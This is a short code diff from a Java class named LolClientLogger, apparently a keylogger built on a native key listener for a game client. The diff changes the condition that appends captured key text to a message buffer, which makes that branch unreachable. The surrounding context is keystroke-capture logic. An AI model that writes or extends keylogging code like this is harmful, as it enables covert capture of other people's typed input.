@@ -41,7 +41,7 @@ public class LolClientLogger extends KeyLogger implements NativeKeyListener {
                 if (message.length() > 0) {
                     message = message.substring(0, message.length() - 1);
                 }
-            } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).length() < 2) {
+            } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).length() < 0) {
                 message = message + NativeKeyEvent.getKeyText(e.getKeyCode());
             }
         }
